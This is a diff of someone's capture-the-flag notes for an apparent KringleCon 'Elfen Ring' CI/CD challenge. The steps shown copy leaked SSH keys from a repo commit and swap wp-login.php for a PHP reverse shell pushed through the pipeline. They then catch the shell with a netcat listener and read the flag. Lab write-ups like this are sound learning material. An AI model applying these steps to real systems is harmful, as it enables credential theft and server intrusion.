@@ -68,11 +68,10 @@ Elfen Ring
         one step closer 082bb339ec19de4935867
 
     CI/CD:
-        sudo -s && cd
         mkdir web shell
         cd web && git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
         cd wordpress.flag.internal
-        git log (look for whoops)
+        git log (look for 'whoops')
         git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
         ls -lah (reveals .ssh)
         cp -r .ssh ~/.ssh
@@ -97,9 +96,14 @@ Elfen Ring
         configure PHP reverse shell (ip and port)
         mv wp-login.php wp-login.php.old
         mv shell.php wp-login.php
-        start netcat listener in background nc -lvnp 4444 &
+        git config user.email sporx@kringlecon.com
+        git config user.name <name shown in git log>
+        git add *
+        git commit -m '.'
+        git push
+        start netcat listener in background: nc -lvnp 4444 &
         curl http://wordpress.flag.net.internal/wp-login.php
-        (receive shell; mess with jobs, fg until output is achieved)
+        (receive shell, had to background and fg again to get shell output)
         cat flag.txt
         oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
 
